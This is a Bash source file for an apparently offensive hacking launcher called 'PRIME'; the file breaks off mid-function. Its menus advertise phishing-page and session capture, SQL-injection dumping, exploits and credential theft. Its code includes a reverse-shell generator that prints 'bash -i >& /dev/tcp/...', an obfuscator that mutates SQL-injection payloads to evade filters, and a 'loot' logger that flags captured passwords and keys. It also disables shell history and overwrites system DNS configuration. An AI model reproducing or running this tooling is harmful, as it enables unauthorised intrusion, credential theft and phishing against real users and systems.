#!/bin/bash
# --- PRIME MASTER LAUNCHER v35.0m1 ---
CURRENT_VERSION="35.4"
G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
set +o history

# --- Инициализация системы ---
# Очистка кэша терминала для стабильной работы
if [ -f "/root/.cache/zcompdump*" ] || [ -f "/root/.zcompdump*" ]; then
    rm -f /root/.cache/zcompdump* 2>/dev/null
    rm -f /root/.zcompdump* 2>/dev/null
fi

CURRENT_IP=$(ip route get 1 2>/dev/null | awk '{print $7}')
[ -z "$CURRENT_IP" ] && CURRENT_IP="127.0.0.1"

SILENT="> /dev/null 2>&1"
# Использование:
command -v curl eval $SILENT

BASE_DIR="/root/core-prime-tools"
MOD_DIR="$BASE_DIR/modules"



# 1. Тихий режим для команд
run_silent() {
    "$@" > /dev/null 2>&1
}

# 2. Быстрая проверка и установка пакетов
# @param {string} package - Название пакета
ensure_pkg() {
    local pkg=$1
    if ! command -v "$pkg" > /dev/null 2>&1; then
        log_msg "info" "Установка $pkg..."
        apt-get install -y "$pkg" > /dev/null 2>&1
    fi
}

# 3. Пауза (Enter)
wait_user() {
    spacer
    echo -ne "${YELLOW}Нажмите [Enter] для возврата в меню...${NC}"
    read -r
}

# 4. Проверка директории модуля
# @param {string} dir_name - Имя папки
ensure_dir() {
    if [ ! -d "$1" ]; then
        run_silent mkdir -p "$1"
        log_msg "success" "Создана директория: $1"
    fi
}


/**
 * Проверка кода завершения последней команды.
 * @param {string} success_msg - Сообщение при успехе.
 * @param {string} error_msg - Сообщение при ошибке.
 * @param {boolean} fatal - Нужно ли остановить скрипт при ошибке (1 - да, 0 - нет).
 */
check_status() {
    local status=$?
    local success_msg="$1"
    local error_msg="$2"
    local fatal="${3:-0}"

    if [ $status -eq 0 ]; then
        log_msg "success" "$success_msg"
    else
        log_msg "error" "$error_msg"
        if [ "$fatal" -eq 1 ]; then
            log_msg "error" "Критический сбой. Работа остановлена."
            exit 1
        fi
    fi
}

/**
 * Перезапуск конкретного модуля.
 * @param {string} proc_name - Имя процесса для grep/pkill.
 * @param {string} start_cmd - Команда запуска.
 */
restart_mod() {
    local name="$1"
    local cmd="$2"
    
    log_msg "info" "Перезапуск модуля $name..."
    run_silent pkill -f "$name"
    sleep 1
    eval "$cmd &"
    check_status "Модуль $name запущен" "Ошибка запуска $name"
}

/**
 * Отрисовка стандартного подменю для модулей.
 * @param {string} mod_name - Имя модуля для заголовка.
 */
draw_mod_menu() {
    clear
    draw_header "Управление: $1"
    echo -e "${YELLOW}1)${NC} Запустить модуль"
    echo -e "${YELLOW}2)${NC} Остановить модуль"
    echo -e "${YELLOW}3)${NC} Проверить логи"
    echo -e "${YELLOW}0)${NC} Назад"
    spacer
}

safe_read() {
    [ -f "$1" ] && cat "$1" || log_msg "warn" "Файл $1 не найден"
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        draw_ui "Эту операцию нужно запускать от ROOT (sudo)!" "status" "$R"
        return 1
    fi
    return 0
}

# Проверка наличия файла/папки (для БД или конфигов)
# Использование: check_file "/root/database.db" "База данных" || return
check_file() {
    local path="$1"
    local name="$2"
    
    if [[ ! -e "$path" ]]; then
        draw_ui "Файл/Путь не найден: $name" "status" "$R"
        echo -e "${Y}Путь: $path${NC}"
        return 1
    fi
    return 0
}

# Универсальная проверка переменной на пустоту
# Использование: check_var "$t_ip" "Target IP" || return
check_var() {
    local value="$1"
    local name="$2"
    
    if [[ -z "$value" ]]; then
        draw_ui "ОШИБКА: Поле [$name] не заполнено!" "status" "$R"
        return 1
    fi
    return 0
}



#Настройки 


# Настройка DNS для локальных сервисов (например, scanclamavlocal)
if command -v dnsmasq >/dev/null 2>&1; then
    cat << EOD > /etc/dnsmasq.conf
domain-needed
bogus-priv
interface=lo
interface=wlan0
address=/scanclamavlocal/$CURRENT_IP
EOD
    service dnsmasq restart 2>/dev/null || (killall dnsmasq 2>/dev/null && dnsmasq -C /etc/dnsmasq.conf 2>/dev/null)
fi

print_line() {
    echo -e "${D}--------------------------------------------------${NC}"
}

# Специализированный вывод системной строки
print_stats_line() {
    local label1="$1" value1="$2"
    local label2="$3" value2="$4"
    local label3="$5" value3="$6"
    echo -e "${Y}$label1: ${G}$value1 ${Y}│ $label2: ${G}$value2 ${Y}│ $label3: ${G}$value3${NC}"
}


/**
 * Функция для отрисовки стандартизированных заголовков меню.
 * @param {string} text - Текст заголовка.
 * @param {string} color - Переменная цвета (например, $BLUE).
 */
draw_header() {
    local text="$1"
    local color="${2:-$BLUE}" # По умолчанию синий
    echo -e "${color}====================================================${NC}"
    if [ ! -z "$text" ]; then
        echo -e "${WHITE}  $text${NC}"
        echo -e "${color}====================================================${NC}"
    fi
}

/**
 * Функция для создания пустых строк (отступов).
 * @param {int} count - Количество строк.
 */
spacer() {
    local count="${1:-1}"
    for ((i=0; i<count; i++)); do echo ""; done
}


/**
 * Функция для вывода статусных сообщений.
 * @param {string} type - Тип сообщения: info, success, warn, error.
 * @param {string} message - Текст сообщения.
 */
log_msg() {
    local type="$1"
    local msg="$2"
    case "$type" in
        "info")    echo -e "${BLUE}[i]${NC} $msg" ;;
        "success") echo -e "${GREEN}[+]${NC} $msg" ;;
        "warn")    echo -e "${YELLOW}[!]${NC} $msg" ;;
        "error")   echo -e "${RED}[X]${NC} $msg" ;;
        *)         echo -e "$msg" ;;
    esac
}

/**
 * Проверка существования критически важного файла.
 * @param {string} path - Путь к файлу.
 * @param {string} module_name - Имя модуля для вывода в лог.
 */
check_component() {
    local path="$1"
    local name="$2"
    if [ -f "$path" ] || [ -d "$path" ]; then
        log_msg "success" "Компонент $name обнаружен: $path"
        return 0
    else
        log_msg "error" "Критическая ошибка: $name не найден по адресу $path"
        return 1
    fi
}

/**
 * Запрос ввода с проверкой.
 * @param {string} prompt_text - Сообщение для пользователя.
 * @param {string} var_name - Имя переменной, куда сохранить результат.
 */
ask_input() {
    local prompt_text="$1"
    local result
    echo -ne "${YELLOW}>>>> ${prompt_text}: ${NC}"
    read result
    echo "$result"
}

# Динамический пункт меню
draw_item() {
    local key="$1"
    local title="$2"
    local desc="$3"
    
    # 1. Динамический цвет ключа
    local k_color=$G
    case "${key,,}" in # Перевод в нижний регистр для проверки
        "b"|"x"|"q"|"exit"|"back") k_color=$R ;;
        "s"|"start"|"run")         k_color=$G ;;
        "i"|"info")                k_color=$Y ;;
        *)                         k_color=$G ;;
    esac

    # 2. Формирование строки
    local output="  ${k_color}${key})${NC} [${B}${title}${NC}]"
    
    # 3. Динамическое добавление описания (если оно есть)
    if [[ -n "$desc" ]]; then
        output+=" - ${desc}"
    fi

    echo -e "$output"
}

# Универсальная функция ввода данных
# Использование: target_ip=$(core_input "IP" "Введите адрес цели")
core_input() {
    local label="$1"
    local hint="$2"
    local var_value
    
    # Рисуем метку через draw_item, но без переноса строки для красоты
    # Мы немного модифицируем логику, чтобы это выглядело как поле ввода
    echo -ne "  ${G}${label})${NC} [${B}${hint}${NC}] ${Y}>> ${NC}" >&2
    read -r var_value
    echo "$var_value"
}




# Универсальная проверка данных (переменные, списки, вводы)
# Использование: check_data "$var" "Target IP" || return 1
check_data() {
    local value="$1"
    local label="$2"
    
    if [[ -z "$value" ]]; then
        # Универсальное сообщение, подходящее и для переменных, и для списков
        draw_ui "ОШИБКА: [$label] отсутствует или не заполнено" "status" "$R"
        return 1
    fi
    return 0
}


# Проверка наличия данных в списке/выводе команды
# Использование: check_list "$devices" "External Storage" || return 1
check_list() {
    local data="$1"
    local name="$2"
    
    if [[ -z "$data" ]]; then
        draw_ui "ОШИБКА: [$name] не обнаружены" "status" "$R"
        return 1
    fi
    return 0
}


# Проверка вхождения числа в диапазон
# Использование: check_range "$choice" 1 "$max" "Выбор устройства" || return 1
check_range() {
    local val="$1"
    local min="$2"
    local max="$3"
    local name="$4"

    if [[ "$val" =~ ^[0-9]+$ ]] && (( val >= min && val <= max )); then
        return 0
    else
        draw_ui "ОШИБКА: [$name] вне диапазона ($min-$max)" "status" "$R"
        return 1
    fi
}


# --- Вспомогательные функции ---
get_stats() {
    # --- СЛОЙ 1: МЕТРИКИ ---
    local ram=$(free -m | awk '/Mem:/ {printf "%d/%dMB", $4, $2}')
    local rom=$(df -h / | awk 'NR==2 {print $4}')
    local sd_info=$(df -h /storage/emulated 2>/dev/null | awk 'NR==2 {print $4}' || echo "N/A")

    # --- СЛОЙ 2: АТОМАРНОЕ ОПРЕДЕЛЕНИЕ СЕТИ ---
    local active_iface=$(ip route get 1.1.1.1 2>/dev/null | awk '{print $5}')
    local net_status="${R}OFFLINE${NC}"
    local net_type="NONE"

    # Проверка "живого" маршрута (без пинга)
    [[ -n "$active_iface" ]] && net_status="${G}CONNECTED${NC}"

    # Эвристическое определение типа (через системные свойства)
    [[ -n "$active_iface" ]] && {
        # Если есть каталог wireless - это WiFi
        [[ -d "/sys/class/net/$active_iface/wireless" || -d "/sys/class/net/$active_iface/phy80211" ]] && net_type="WLAN"
        # Если это tun/tap - это VPN
        [[ "$active_iface" =~ ^(tun|tap|ppp) ]] && net_type="VPN"
        # Если в названии rmnet или это специфический usb - это MOBILE
        [[ "$active_iface" =~ ^(rmnet|wwan|ccmni) ]] && net_type="MOBILE"
        # Универсальный fallback: если тип еще не определен, но это не lo
        [[ "$net_type" == "NONE" ]] && net_type="ETH/OTHER"
    }

    # --- СЛОЙ 3: СЕРВИСЫ ---
    local active_srv=""
    local check_list=("av_server.py:AV" "share_server.py:SH" "upload_server.py:UP")
    for srv in "${check_list[@]}"; do
        pgrep -f "${srv%%:*}" >/dev/null && active_srv+="${G}[${srv#*:}]${NC} "
    done
    active_srv=${active_srv:-"${R}NONE${NC}"}

    # --- СЛОЙ 4: ВЫВОД ---
    print_line
    print_stats_line "RAM" "$ram" "ROM" "$rom" "SD" "$sd_info"
    
    # Теперь net_type точно не будет (none) при активном соединении
    echo -e "${Y}NET: $net_status ${B}($net_type: $active_iface) ${Y}│ ACTIVE SRV: $active_srv"
    
    print_line
}

pause() { echo -e "\n${Y}Press Enter to return...${NC}"; read -r _; }

exit_script() { 
    echo -e "${R}Cleaning history and exiting...${NC}"
    history -c
    exit 0 
}

show_progress() {
    local duration=$1
    local message=${2:-"CORE-PRIME SYNCHRONIZATION"}
    
    # 1. Калибровка экрана
    local col=$(tput cols 2>/dev/null || echo 60)
    local width=$(( col - 35 ))
    [[ $width -lt 15 ]] && width=25
    
    # Расчет задержки (безопасный режим)
    local delay=$(echo "scale=4; $duration / $width" | bc -l 2>/dev/null || echo "0.1")

    # Цветовая палитра
    local c_low='\033[38;5;220m'  # Yellow
    local c_mid='\033[38;5;39m'   # Cyan
    local c_high='\033[38;5;82m'  # Green
    local c_head='\033[1;37m'     # White Head
    local c_dim='\033[38;5;240m'  # Gray Shade

    echo -e "${Y}❯ ${message}${NC}"

    # 2. Основной цикл рендеринга
    for ((i=1; i<=width; i++)); do
        local percent=$(( i * 100 / width ))
        
        # Выбор цвета
        local current_color="$c_low"
        [[ $percent -gt 40 ]] && current_color="$c_mid"
        [[ $percent -gt 85 ]] && current_color="$c_high"
        
        # Формируем тело бара (накопление)
        local bar=""
        for ((j=1; j<i; j++)); do
            bar="${bar}█"
        done
        
        # Добавляем "голову" (Pipe-эффект)
        if [[ $i -lt $width ]]; then
            bar="${bar}${c_head}❯${NC}"
        else
            bar="${bar}${current_color}█${NC}"
        fi
        
        # Формируем фон (пустота)
        local pad=""
        for ((j=i; j<width; j++)); do
            pad="${pad}░"
        done

        # --- СЕКЦИЯ ПРЕЦИЗИОННОГО ВЫВОДА ---
        # printf %-s гарантирует, что старые символы в конце строки будут затерты
        # %3d%% делает так, чтобы 5% и 100% занимали одинаковое место
        printf "\r ${c_dim}Status:${NC} ${Y}[%b%b%b${Y}] %3d%%${NC} " \
            "$current_color" "$bar" "$c_dim$pad" "$percent"

        sleep $delay
    done
    
    # 3. Финализация
    echo -e "\n${G}✔️ CORE LOOP SECURED.${NC}\n"
}



# --- Универсальный динамический контроллер ---
prime_dynamic_controller() {
    local title="$1"
    local -a labels=($2)
    local -a actions=($3)
    
    while true; do
        #clear
        echo -e "${R}========== [ $title ] ==========${NC}"
        get_stats
        echo -e "---------------------------------------"
        
        for ((i=0; i<${#labels[@]}; i++)); do
            printf "${G}%2d) %-18s${NC}" "$((i+1))" "${labels[$i]//_/ }"
            if (( (i+1) % 2 == 0 )); then echo ""; fi
        done
        
        # Если количество элементов нечетное, добавляем перенос строки перед BACK
        if (( ${#labels[@]} % 2 != 0 )); then echo ""; fi
        
        echo -e "\n${Y} B) BACK / EXIT${NC}"
        echo -e "---------------------------------------"
        
        read -p ">> " choice
        if [[ "$choice" == "b" ]] || [[ "$choice" == "B" ]]; then return 0; fi
        
        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#labels[@]}" ]; then
            local idx=$((choice-1))
            ${actions[$idx]}
        else
            echo -e "${R}[!] Ошибка: выберите 1-${#labels[@]} или B${NC}"; sleep 1
        fi
    done
}

print_header() {
    local title="$1"
    #clear
    echo -e "${R}--------------------------------------------------${NC}"
    # Центрируем текст: 46 символов свободного места в рамке
    # Используем printf для выравнивания
    printf "${R}|%*s%s%*s|${NC}\n" $(((48-${#title})/2)) "" "$title" $(((49-${#title})/2)) ""
    echo -e "${R}--------------------------------------------------${NC}"
}

# Типы: i (info), s (success), e (error), w (warning)
print_status() {
    local type="$1"
    local msg="$2"
    case "$type" in
        "i") echo -e "${B}[*] ${NC}$msg" ;;
        "s") echo -e "${G}[+] ${NC}$msg" ;;
        "e") echo -e "${R}[!] ${NC}$msg" ;;
        "w") echo -e "${Y}[?] ${NC}$msg" ;;
        *) echo -e "$msg" ;;
    esac
}

log_loot() {
    local module="${1:-unknown}"
    local data="$2"
    local loot_dir="/root/prime_loot"
    local master_log="${loot_dir}/master_intelligence.log"
    local module_file="${loot_dir}/${module}_results.txt"

    # --- СЛОЙ 1: БЕЗУСЛОВНАЯ ИНФРАСТРУКТУРА ---
    # Создаем, если нет, и фиксируем права одной строкой
    [[ -d "$loot_dir" ]] || (mkdir -p "$loot_dir" && chmod 700 "$loot_dir")

    # --- СЛОЙ 2: ПОТОКОВАЯ МАРКИРОВКА (Severity) ---
    # Используем grep как фильтр: если нашел — severity станет CRITICAL, иначе INFO
    local severity="INFO"
    echo "$data" | grep -qiE "password|pwd|root|admin|vuln|critical|key|access|granted" && severity="CRITICAL"
    echo "$data" | grep -qiE "user|ip|domain|node" && [[ "$severity" == "INFO" ]] && severity="TARGET"

    # --- СЛОЙ 3: ФОРМИРОВАНИЕ ОТПЕЧАТКА ---
    local entry="[$(date '+%Y-%m-%d %H:%M:%S')] [$severity] [$module] -> $data"

    # --- СЛОЙ 4: АТОМАРНАЯ ЗАПИСЬ ---
    # Пишем в файл модуля и сразу принуждаем к правам 600
    echo "$entry" >> "$module_file" && chmod 600 "$module_file" 2>/dev/null

    # Короткое замыкание для критических данных (заменяет IF)
    [[ "$severity" == "CRITICAL" ]] && {
        echo "$entry" >> "$master_log"
        echo "SIGNAL_ID:$(date +%s) | DATA:$data" >> "${loot_dir}/bridge_signals.log"
        chmod 600 "$master_log" "${loot_dir}/bridge_signals.log" 2>/dev/null
    }

    # --- СЛОЙ 5: МЕХАНИЧЕСКАЯ РОТАЦИЯ (No-IF) ---
    # Используем арифметическое сравнение прямо в условии выполнения
    (( $(stat -c%s "$module_file" 2>/dev/null || echo 0) > 1048576 )) && {
        local tmp="${module_file}.tmp"
        tail -n 100 "$module_file" > "$tmp" && mv "$tmp" "$module_file" && chmod 600 "$module_file"
    }

    # Финальный алерт через оператор &&
    [[ "$severity" == "CRITICAL" ]] && echo -e "  ${R}[!] CRITICAL SECURED${NC}"
}

# Аргументы: $1 - тип проверки (cmd, file, port, dir), $2 - цель, $3 - текст ошибки
check_step() {
    local type="$1"
    local target="$2"
    local err_msg="$3"
    local status=1

    case "$type" in
        "cmd") command -v "$target" >/dev/null 2>&1 && status=0 ;;
        "file") [[ -f "$target" ]] && status=0 ;;
        "dir")  [[ -d "$target" ]] && status=0 ;;
        "port") timeout 1 bash -c "cat < /dev/tcp/${target/:/ }" 2>/dev/null && status=0 ;;
    esac

    if [[ $status -ne 0 ]]; then
        print_status "e" "$err_msg"
        return 1
    fi
    return 0
}

ask_confirm() {
    local prompt="$1"
    echo -en "${Y}$prompt (y/n): ${NC}"
    read -r answer
    [[ "$answer" == "y" ]]
}



# Аргументы: $1 - текст вопроса, $2... - варианты (формат "описание:аргументы")
select_option() {
    local prompt="$1"; shift
    local options=("$@")
    local count=1
    local total=${#options[@]}

    echo -e "${W}[?] $prompt${NC}"

    for ((i=0; i<total; i++)); do
        local opt="${options[$i]}"
        # Форматируем строку: номер и текст (ограничиваем длину для колонки)
        local display_text="${G}$count)${NC} ${opt%%:*}"
        
        # Печатаем элемент с фиксированной шириной колонки (например, 25 символов)
        printf " %-35b" "$display_text"

        # Если индекс четный (вторая колонка) или это последний элемент — переходим на новую строку
        if (( count % 2 == 0 )) || (( count == total )); then
            echo ""
        fi
        ((count++))
    done

    echo -en "${Y}>> ${NC}"
    read -r user_input
    CHOICE="$user_input"
}

select_optionold() {
    local prompt="$1"; shift
    local options=("$@")
    local count=1

    echo -e "${W}[?] $prompt${NC}"
    for opt in "${options[@]}"; do
        echo -e " ${G}$count)${NC} ${opt%%:*}"
        ((count++))
    done

    echo -en "${Y}>> ${NC}"
    read -r user_input
    # Передаем только цифру
    CHOICE="$user_input"
}



# Для красивых запросов ввода
print_input() {
    local prompt="$1"
    local default="$2"
    echo -en "${Y}[?] $prompt ${W}(Default: $default)${Y}: ${NC}"
}

# Для вывода списков (ключи, файлы, пути)
print_list() {
    local title="$1"; shift
    echo -e "${Y}--- $title ---${NC}"
    for item in "$@"; do
        echo -e "    ${G}>> ${W}$item${NC}"
    done
}

smart_cat() {
    local path="$1"
    local content="$2"
    echo "$content" > "$path"
    chmod +x "$path"
    print_status "i" "Engine component updated: $path"
}


# --- ENGINE: NEURAL OBSTRUCTION (Вставлять перед функцией run_sql_adaptive) ---
mutate_case() {
    local input="$1"
    local output=""
    for (( i=0; i<${#input}; i++ )); do
        char="${input:$i:1}"
        (( RANDOM % 2 )) && output+="${char^^}" || output+="${char,,}"
    done
    echo -n "$output"
}

mutate_space() {
    local variants=("/**/" "+" "%20" "%09" "%0a" "/**/--/**/")
    echo -n "${variants[$(( RANDOM % ${#variants[@]} ))]}"
}

# Адаптация под SQL-инъекции
prime_obfuscate() {
    local payload="$1"
    local result=""
    for word in $payload; do
        result+="$(mutate_case "$word")$(mutate_space)"
    done
    echo -n "$result"
}


get_tool_info() {
    case "$1" in
        # --- Главное меню (Main Menu) ---
        "run_ghost_commander")      echo "ADB-контроль Android: зеркало, биометрия, Shell, управление файлами." ;;
        "run_phantom_engine")       echo "Social Engineering Framework: создание фишинг-страниц и сбор сессий." ;;
        "run_sql_adaptive")         echo "Инструментарий для SQL-инъекций: адаптивный поиск и дамп баз данных." ;;
        "run_device_hack")          echo "Комплексный анализ: сетевая разведка, Bluetooth и глубокий аудит." ;;
        "run_smart_osint_engine")   echo "OSINT-движок: поиск по IP, почте, телефонам и доменам." ;;
        "run_iban_analyzer")        echo "Финансовый анализ: проверка IBAN, банковских кодов и транзакций." ;;
        "run_pass_lab")             echo "Лаборатория паролей: генерация словарей и анализ стойкости хэшей." ;;
        "run_crypto_forge")         echo "Криптографический модуль: шифрование, расшифровка и работа с ключами." ;;
        "run_vulnerability_scanner") echo "Ghost Engine: сканер уязвимостей и поиск векторов для проникновения." ;;
        "run_prime_exploiter_v5")   echo "Ultimate Exploiter: база эксплойтов для известных CVE и 0-day." ;;
        "pc_password_recovery")     echo "Хаб управления ПК: эксплойты, сброс паролей и форензика." ;;
        "run_view_loot")            echo "Просмотр добычи (Intelligence Center): логи, пароли, дампы." ;;
        "run_system_info")          echo "Мониторинг системы: параметры CPU, RAM, Network и статус защиты." ;;
        "run_servers")              echo "Service Hub: запуск локальных серверов для обмена файлами и скана." ;;
        "run_repair")               echo "Инструменты самовосстановления и очистки мусора в ядре Prime." ;;
        "update_prime")             echo "Обновление ядра до последней версии с GitHub репозитория." ;;
        "exit_script")              echo "Безопасное завершение работы и очистка временных сессий." ;;

        # --- Подменю: DEVICE_HACK ---
        "run_network_analyzer")     echo "Network Intelligence: анализ трафика и обнаружение устройств в сети." ;;
        "scan_bluetooth_devices")   echo "Bluetooth Scan: перехват ID и анализ уязвимостей BT-протоколов." ;;
        "run_deep_audit")           echo "Smart Audit: глубокая проверка безопасности текущей системы." ;;

        # --- Подменю: PC_RECOVERY & EXPLOIT (уже были) ---
        "pc_gen_payload")           echo "Генерация реверс-шеллов (Bash/Python). Авто-настройка LHOST." ;;
        "run_pc_recovery_ultimate") echo "Сброс паролей Win/Lin/Mac и извлечение данных (LaZagne)." ;;
        "run_forensic_scanner")     echo "Автономная защита: килл-процессов, блок портов, карантин." ;;

        # --- Подменю: SERVICE_HUB (run_servers) ---
        "run_av_srv")               echo "AV-Scanner Server: удаленная проверка файлов на сигнатуры вирусов." ;;
        "run_share_srv")            echo "Share-File: быстрый HTTP-сервер для раздачи файлов в локальной сети." ;;
        "run_upload_srv")           echo "Upload-Inbound: защищенный приемник для входящих файлов." ;;

        *)                          echo "Описание функционала находится в стадии разработки..." ;;
    esac
}


show_menu_info() {
    local funcs=$1
    echo -e "${B}┌── INFO CENTER ──────────────────────────────────────────┐${NC}"
    local i=1
    for f in $funcs; do
        local desc=$(get_tool_info "$f")
        printf "${B}│${NC}  ${Y}%02d.${NC} %-50s ${B}│${NC}\n" "$i" "$desc"
        ((i++))
    done
    echo -e "${B}└─────────────────────────────────────────────────────────┘${NC}"
}


# --- ГЕНЕРАТОРЫ ШАБЛОНОВ (View Engine) ---

generate_core_form_template() {
    cat << 'EOF'
def render_prime_form(action_url, fields=None, btn_text="INITIATE TRANSFER"):
    if fields is None: fields = [{"type": "file", "name": "file", "label": "Drop files here or click to upload"}]
    
    inputs_html = ""
    js_needed = False
    
    for field in fields:
        f_type = field.get("type", "text")
        f_name = field.get("name", "input")
        f_label = field.get("label", "Field")
        
        if f_type == "file":
            js_needed = True
            inputs_html += f"""
            <div class="drop-zone" id="drop-zone">
                <span class="drop-zone__prompt">{f_label}</span>
                <input type="file" name="{f_name}" class="drop-zone__input" id="file-input">
            </div>
            """
        else:
            inputs_html += f"""
            <div style="margin: 15px 0;">
                <label style="font-size:0.7rem; opacity:0.6; display:block;">{f_label}</label>
                <input type="{f_type}" name="{f_name}" style="background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); color:white; padding:10px; width:100%; border-radius:0.5rem;">
            </div>
            """

    script = """
    <script>
    const dropZone = document.getElementById('drop-zone');
    const fileInput = document.getElementById('file-input');
    if(dropZone) {
        dropZone.addEventListener('click', () => fileInput.click());
        fileInput.addEventListener('change', () => {
            if(fileInput.files.length) updatePrompt(dropZone, fileInput.files[0].name);
        });
        ['dragover', 'dragleave', 'drop', 'dragend'].forEach(type => {
            dropZone.addEventListener(type, e => { e.preventDefault(); });
        });
        dropZone.addEventListener('dragover', () => dropZone.classList.add('drop-zone--over'));
        ['dragleave', 'drop', 'dragend'].forEach(type => {
            dropZone.addEventListener(type, () => dropZone.classList.remove('drop-zone--over'));
        });
        dropZone.addEventListener('drop', e => {
            if(e.dataTransfer.files.length) {
                fileInput.files = e.dataTransfer.files;
                updatePrompt(dropZone, e.dataTransfer.files[0].name);
            }
        });
    }
    function updatePrompt(zone, name) { zone.querySelector('.drop-zone__prompt').textContent = 'READY: ' + name; zone.style.borderColor = '#00ff41'; }
    </script>
    """ if js_needed else ""

    return f"""
    <form method="post" action="{action_url}" enctype="multipart/form-data">
        {inputs_html}
        <button type="submit" style="margin-top:20px;">{btn_text}</button>
    </form>
    {script}
    """
EOF
}



generate_core_template() {
    cat << 'EOF'
def render_prime_page(title, content):
    style = """
    <style>
        :root { --accent: #00ff41; --bg: #0a0a0c; --glass: rgba(20, 20, 25, 0.8); }
        body { background: var(--bg); color: #e0e0e0; font-family: system-ui, -apple-system, sans-serif; min-height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; }
        .prime-card { background: var(--glass); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.1); border-radius: 1.5rem; padding: 2rem; width: 95%; max-width: 900px; box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
        h2 { background: linear-gradient(to right, #fff, var(--accent)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; }
        
        /* Адаптивная сетка Share */
        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 1rem; margin-top: 1.5rem; }
        .file-item { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); border-radius: 1rem; padding: 1rem; text-align: center; transition: 0.2s; text-decoration: none; color: inherit; }
        .file-item:hover { border-color: var(--accent); background: rgba(0,255,65,0.05); transform: translateY(-3px); }
        .file-icon { font-size: 2rem; margin-bottom: 0.5rem; display: block; }
        
        /* Умный Drag & Drop */
        .drop-zone { border: 2px dashed rgba(0,255,65,0.3); border-radius: 1rem; padding: 2rem; transition: 0.3s; cursor: pointer; position: relative; }
        .drop-zone--over { border-color: var(--accent); background: rgba(0,255,65,0.05); box-shadow: inset 0 0 20px rgba(0,255,65,0.1); }
        .drop-zone__input { display: none; }
        
        button { background: var(--accent); color: #000; border: none; padding: 10px 20px; border-radius: 0.5rem; font-weight: bold; width: 100%; cursor: pointer; transition: 0.2s; }
        button:hover { opacity: 0.8; transform: scale(1.01); }
        pre { background: #000; color: #0cf; padding: 1rem; border-radius: 0.5rem; overflow: auto; max-height: 300px; font-size: 0.8rem; border-left: 3px solid var(--accent); }
    </style>
    """
    return f"""
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        {style}
    </head>
    <body>
        <div class="prime-card">
            <small style="color:var(--accent); letter-spacing:2px;">SECURE_UPLINK_v4.2</small>
            <h2>{title}</h2>
            {content}
        </div>
    </body>
    </html>
    """
EOF
}


# --- Конец  Модулей ---



run_system_pulse() {
    print_header "SECTOR Z: LIVE SYSTEM PULSE"
    print_status "i" "Monitoring filesystem events and net-connections..."
    
    # Показываем активные сетевые соединения (куда лезет система)
    echo -e "${Y}[NETWORK CONNECTIONS]:${NC}"
    ss -tunp | grep -v "127.0.0.1" | head -n 10 | sed 's/^/  /'
    
    echo -e "${B}------------------------------------------------------------${NC}"
    
    # Живой мониторинг изменений файлов в /tmp и $PRIME_LOOT
    print_status "w" "Watching for file activity (Press Ctrl+C to stop)..."
    # Используем встроенный в ядро dnotify/inotify если есть, или просто мониторим через ls
    watch -n 2 "ls -lt /tmp $PRIME_LOOT | head -n 15"
}


# Вспомогательные функции-мостики (для чистоты кода)
pc_gen_payload() {
    print_header "PAYLOAD GENERATOR"
    local l_ip=$(ifconfig eth0 2>/dev/null | awk '/inet / {print $2}' || echo "127.0.0.1")
    echo -e "${Y}Current LHOST:${NC} $l_ip"
    echo -en "${Y}Enter LPORT (4444): ${NC}"; read -r l_port
    [[ -z "$l_port" ]] && l_port="4444"
    show_progress 3 "COMPILING REVERSE SHELL"
    echo -e "\n${G}RAW BASH:${NC}\nbash -i >& /dev/tcp/$l_ip/$l_port 0>&1\n"
    pause
}

# Редиректы на существующие модули, чтобы не дублировать код
pc_steal_creds() { run_pc_recovery_ultimate; }
pc_post_exploit() { run_forensic_scanner; }



# --- Модули по меню ---

run_forensic_scanner() {
    print_header "AUTONOMOUS DEFENSE & REMEDIATION"
    
    # 1. Транспорт (Выбор цели)
    local target=$(select_option "Select Target for Auto-Sanitization:" \
        "Local (Current Device):local" \
        "Android/IoT (via ADB/USB):adb" \
        "Remote Server (via SSH/IP):ssh" \
        "Back:exit")

    [[ "$target" == "exit" || -z "$target" ]] && return
    local cmd_prefix=""
    
    case "$target" in
        "adb")
            check_step "cmd" "adb" "ADB not installed." || return
            adb wait-for-device
            cmd_prefix="adb shell " ;;
        "ssh")
            echo -en "${Y}Enter Remote User@IP: ${NC}"; read -r rh
            [[ -z "$rh" ]] && return
            cmd_prefix="ssh $rh " ;;
    esac

    show_progress 5 "ENGAGING AUTONOMOUS PURGE"

    # --- ФАЗА 1: АВТО-ЛИКВИДАЦИЯ ПРОЦЕССОВ ---
    print_status "!" "Phase 1: Terminal Process Neutralization..."
    # Автоматический поиск и убийство зомби (Z) и подозрительных (D) процессов
    local bad_procs=$($cmd_prefix "ps -eo pid,stat,comm | awk '\$2~/[ZDe]/ {print \$1}'")
    
    if [[ -n "$bad_procs" ]]; then
        for pid in $bad_procs; do
            print_status "w" "Autonomous Kill: PID $pid (Suspicious State)"
            $cmd_prefix "kill -9 $pid" 2>/dev/null
        done
        print_status "s" "All suspicious processes neutralized."
    else
        print_status "s" "Process tree secure."
    fi

    # --- ФАЗА 2: АВТО-БЛОКИРОВКА ПОРТОВ ---
    print_status "!" "Phase 2: Shadow Port Isolation..."
    # Список критических портов для авто-блокировки (бэкдоры, шеллы)
    local ports=$($cmd_prefix "netstat -an | grep LISTEN | awk '{print \$4}' | awk -F: '{print \$NF}'")
    local blacklisted_ports="4444 5555 6666 7777 8888 9999"

    for port in $ports; do
        for bl in $blacklisted_ports; do
            if [[ "$port" == "$bl" ]]; then
                print_status "w" "Auto-Blocking DANGER Port: $port"
                $cmd_prefix "iptables -A INPUT -p tcp --dport $port -j DROP" 2>/dev/null
                $cmd_prefix "fuser -k -n tcp $port" 2>/dev/null # Убиваем процесс, занявший порт
            fi
        done
    done

    # --- ФАЗА 3: МГНОВЕННЫЙ КАРАНТИН ФАЙЛОВ ---
